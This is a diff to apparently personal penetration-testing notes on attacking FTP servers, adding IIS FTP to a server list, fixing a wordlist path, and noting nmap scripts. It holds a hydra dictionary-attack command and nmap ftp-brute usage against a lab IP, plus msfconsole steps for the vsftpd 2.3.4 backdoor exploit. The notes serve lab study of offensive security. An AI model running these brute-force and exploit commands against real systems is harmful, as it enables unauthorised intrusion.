@@ -28,6 +28,7 @@ File sharing protocol used by different services
 vsftp
 SFTP
 ProFTPD
+IIS FTP
 
 ---
 
@@ -40,7 +41,7 @@ Dictionary attack with *userlist* and *passlist*
 - -L : user File
 - -P : pass File
 ```bash
-hydra -L /usr/share/metasploit-framework/data/wordlist/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.24.3 -t 4 ftp
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.24.3 -t 4 ftp
 ```
 
 ---
@@ -55,10 +56,12 @@ nmap 192.168.24.3 --script ftp-brute --script-args userdb=/root/users -p 21
 - --script
 	- ftp-brute
 		- `--sript-args userdb=/userlist.txt`
+	- ftp-anon : checks for anonymous login
 
 ---
 
-## msfconsole
+## #msfconsole
+[Tool Info - MSF](../Tools/MSF.md)
 
 1. `search type:exploit vsftpd`
 2. `use exploit/unix/ftp/vsftpd_234_backdoor`
